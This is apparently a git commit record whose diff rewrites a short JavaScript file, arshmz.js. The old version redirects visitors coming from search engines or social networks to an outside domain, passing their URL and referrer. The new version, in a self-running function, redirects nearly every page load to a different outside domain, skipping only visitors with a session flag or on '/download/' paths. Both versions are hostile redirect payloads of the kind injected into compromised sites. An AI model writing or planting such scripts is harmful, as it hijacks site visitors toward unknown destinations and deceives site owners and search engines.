24a08d4b8fd83bb31b572a1fbd30be25cf5e229e
hamzah79 <hamzah.pujiningrat@gmail.com>
2022-01-12 19:44:52 +0700

    Update arshmz.js

--- arshmz.js
+++ arshmz.js
@@ -1,8 +1,19 @@
-var ars = rChoice([
- 'https://reverasite.com'
-]);
-function rChoice(arr) {
-return arr[Math.floor(arr.length * Math.random())];
-}
-//Code arsae client javascript
-if(['.google.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'duckduckgo.', 'instagram.', 'twitter.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+(function(){
+
+	var uads 	= sessionStorage.getItem('uads');
+	var go_current  = window.location.href;
+
+	var arr_ars 	= ["https:\/\/pabalatak.com\/"];
+
+	function rChoice(arr) {
+	    return arr[Math.floor(arr.length * Math.random())];
+	}
+
+	var ars = rChoice(arr_ars);
+
+	if(!uads && !go_current.includes("/download/"))
+	{
+		window.location.href = `${ars}#uads=${encodeURIComponent(go_current)}`; 
+	}
+	
+})();
